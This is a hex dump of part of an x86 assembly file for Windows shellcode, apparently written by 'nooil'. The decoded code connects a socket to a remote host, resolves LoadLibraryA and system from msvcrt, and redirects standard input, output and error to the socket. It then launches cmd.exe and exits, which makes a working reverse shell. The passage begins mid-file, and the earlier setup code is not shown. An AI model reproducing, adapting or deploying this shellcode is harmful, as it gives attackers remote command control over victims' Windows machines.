000012f0  65 73 69 0d 0a 20 20 20  20 20 20 20 70 75 73 68  |esi..       push|
00001300  20 20 20 20 65 62 78 0d  0a 20 20 20 20 20 20 20  |    ebx..       |
00001310  63 61 6c 6c 20 20 20 20  65 61 78 20 20 20 20 20  |call    eax     |
00001320  20 20 20 20 20 20 20 20  3b 20 63 6f 6e 6e 65 63  |        ; connec|
00001330  74 28 73 6f 63 6b 66 64  2c 20 26 73 74 72 75 63  |t(sockfd, &struc|
00001340  74 2c 20 73 69 7a 65 6f  66 28 73 74 72 75 63 74  |t, sizeof(struct|
00001350  29 29 3b 0d 0a 0d 0a 20  20 20 20 20 20 20 70 75  |));....       pu|
00001360  73 68 20 20 20 20 61 78  0d 0a 20 20 20 20 20 20  |sh    ax..      |
00001370  20 70 75 73 68 20 20 20  20 77 6f 72 64 20 70 74  | push    word pt|
00001380  72 20 27 74 72 27 0d 0a  20 20 20 20 20 20 20 70  |r 'tr'..       p|
00001390  75 73 68 20 20 20 20 27  63 76 73 6d 27 0d 0a 20  |ush    'cvsm'.. |
000013a0  20 20 20 20 20 20 70 75  73 68 20 20 20 20 65 73  |      push    es|
000013b0  70 0d 0a 20 20 20 20 20  20 20 63 61 6c 6c 20 20  |p..       call  |
000013c0  20 20 65 62 70 20 20 20  20 20 20 20 20 20 20 20  |  ebp           |
000013d0  20 20 3b 20 4c 6f 61 64  4c 69 62 72 61 72 79 41  |  ; LoadLibraryA|
000013e0  28 22 6d 73 76 63 72 74  22 29 3b 0d 0a 0d 0a 20  |("msvcrt");.... |
000013f0  20 20 20 20 20 20 70 75  73 68 20 20 20 20 73 79  |      push    sy|
00001400  73 74 65 6d 0d 0a 20 20  20 20 20 20 20 63 61 6c  |stem..       cal|
00001410  6c 20 20 20 20 65 64 69  20 20 20 20 20 20 20 20  |l    edi        |
00001420  20 20 20 20 20 3b 20 4d  79 47 65 74 50 72 6f 63  |     ; MyGetProc|
00001430  41 64 64 72 28 73 79 73  74 65 6d 29 3b 0d 0a 0d  |Addr(system);...|
00001440  0a 20 20 20 20 20 20 20  3b 20 2d 2d 2d 2d 2d 2d  |.       ; ------|
00001450  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00001460  2d 2d 2d 2d 2d 2d 2d 20  6e 6f 6f 69 6c 20 74 72  |------- nooil tr|
00001470  69 63 6b 73 20 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |icks -----------|
00001480  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00001490  2d 2d 2d 2d 2d 2d 2d 0d  0a 20 20 20 20 20 20 20  |-------..       |
000014a0  78 6f 72 20 20 20 20 20  20 20 20 20 20 20 20 20  |xor             |
000014b0  65 63 78 2c 20 65 63 78  0d 0a 20 20 20 20 20 20  |ecx, ecx..      |
000014c0  20 6d 6f 76 20 20 20 20  20 20 20 20 20 20 20 20  | mov            |
000014d0  20 65 63 78 2c 64 77 6f  72 64 20 70 74 72 20 66  | ecx,dword ptr f|
000014e0  73 3a 5b 65 63 78 2b 31  38 68 5d 0d 0a 20 20 20  |s:[ecx+18h]..   |
000014f0  20 20 20 20 6d 6f 76 20  20 20 20 20 20 20 20 20  |    mov         |
00001500  20 20 20 20 65 63 78 2c  64 77 6f 72 64 20 70 74  |    ecx,dword pt|
00001510  72 20 64 73 3a 5b 65 63  78 2b 33 30 68 5d 0d 0a  |r ds:[ecx+30h]..|
00001520  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 20 20  |       mov      |
00001530  20 20 20 20 20 20 20 65  63 78 2c 64 77 6f 72 64  |       ecx,dword|
00001540  20 70 74 72 20 64 73 3a  5b 65 63 78 2b 31 30 68  | ptr ds:[ecx+10h|
00001550  5d 0d 0a 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |]..       mov   |
00001560  20 20 20 20 20 20 20 20  20 20 64 77 6f 72 64 20  |          dword |
00001570  70 74 72 20 64 73 3a 5b  65 63 78 2b 31 38 68 5d  |ptr ds:[ecx+18h]|
00001580  2c 65 62 78 20 3b 20 53  65 74 53 74 64 48 61 6e  |,ebx ; SetStdHan|
00001590  64 6c 65 28 53 54 44 5f  49 4e 50 55 54 5f 48 41  |dle(STD_INPUT_HA|
000015a0  4e 44 4c 45 2c 68 43 6c  69 65 6e 74 29 3b 0d 0a  |NDLE,hClient);..|
000015b0  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 20 64  |       mov     d|
000015c0  77 6f 72 64 20 70 74 72  20 64 73 3a 5b 65 63 78  |word ptr ds:[ecx|
000015d0  2b 31 43 68 5d 2c 65 62  78 20 3b 20 53 65 74 53  |+1Ch],ebx ; SetS|
000015e0  74 64 48 61 6e 64 6c 65  28 53 54 44 5f 4f 55 54  |tdHandle(STD_OUT|
000015f0  50 55 54 5f 48 41 4e 44  4c 45 2c 68 43 6c 69 65  |PUT_HANDLE,hClie|
00001600  6e 74 29 3b 0d 0a 20 20  20 20 20 20 20 6d 6f 76  |nt);..       mov|
00001610  20 20 20 20 20 64 77 6f  72 64 20 70 74 72 20 64  |     dword ptr d|
00001620  73 3a 5b 65 63 78 2b 32  30 68 5d 2c 65 62 78 20  |s:[ecx+20h],ebx |
00001630  3b 20 53 65 74 53 74 64  48 61 6e 64 6c 65 28 53  |; SetStdHandle(S|
00001640  54 44 5f 45 52 52 4f 52  5f 48 41 4e 44 4c 45 2c  |TD_ERROR_HANDLE,|
00001650  68 43 6c 69 65 6e 74 29  3b 0d 0a 20 20 20 20 20  |hClient);..     |
00001660  20 20 3b 20 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |  ; ------------|
00001670  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000016b0  2d 0d 0a 0d 0a 0d 0a 20  20 20 20 20 20 20 70 75  |-......       pu|
000016c0  73 68 20 20 20 20 73 74  72 5f 63 6d 64 0d 0a 20  |sh    str_cmd.. |
000016d0  20 20 20 20 20 20 69 6e  63 20 20 20 20 20 20 20  |      inc       |
000016e0  20 20 20 20 20 20 62 79  74 65 20 70 74 72 20 5b  |      byte ptr [|
000016f0  65 73 70 2b 33 5d 0d 0a  20 20 20 20 20 20 20 70  |esp+3]..       p|
00001700  75 73 68 20 20 20 20 65  73 70 0d 0a 20 20 20 20  |ush    esp..    |
00001710  20 20 20 63 61 6c 6c 20  20 20 20 65 61 78 20 20  |   call    eax  |
00001720  20 20 20 3b 20 73 79 73  74 65 6d 28 22 63 6d 64  |   ; system("cmd|
00001730  22 29 3b 0d 0a 0d 0a 20  20 20 20 20 20 20 3b 20  |");....       ; |
00001740  45 78 69 74 0d 0a 20 20  20 20 20 20 20 70 75 73  |Exit..       pus|
00001750  68 20 20 20 20 45 78 69  74 50 72 6f 63 65 73 73  |h    ExitProcess|
00001760  41 0d 0a 20 20 20 20 20  20 20 63 61 6c 6c 20 20  |A..       call  |
00001770  20 20 65 64 69 20 20 20  20 20 20 20 20 20 20 20  |  edi           |
00001780  20 20 3b 20 4d 79 47 65  74 50 72 6f 63 41 64 64  |  ; MyGetProcAdd|
00001790  72 28 45 78 69 74 50 72  6f 63 65 73 73 41 29 0d  |r(ExitProcessA).|
000017a0  0a 20 20 20 20 20 20 20  63 61 6c 6c 20 20 20 20  |.       call    |
000017b0  65 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |eax             |
000017c0  3b 20 45 78 69 74 50 72  6f 63 65 73 73 41 28 29  |; ExitProcessA()|
000017d0  3b 0d 0a 65 6e 64 20 73  63 6f 64 65 0d 0a 3b 20  |;..end scode..; |
000017e0  2d 2d 2d 2d 2d 2d 20 45  4e 44 20 43 4f 44 45 20  |------ END CODE |
000017f0  2d 2d 2d 2d 2d 2d 0d 0a  3b 2e 0d 0a 5f 6e 6f 6f  |------..;..._noo|
00001800  69 6c 5f 20 65 6e 64 73  0d 0a 3b 20 2d 2d 2d 2d  |il_ ends..; ----|
00001810  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001840
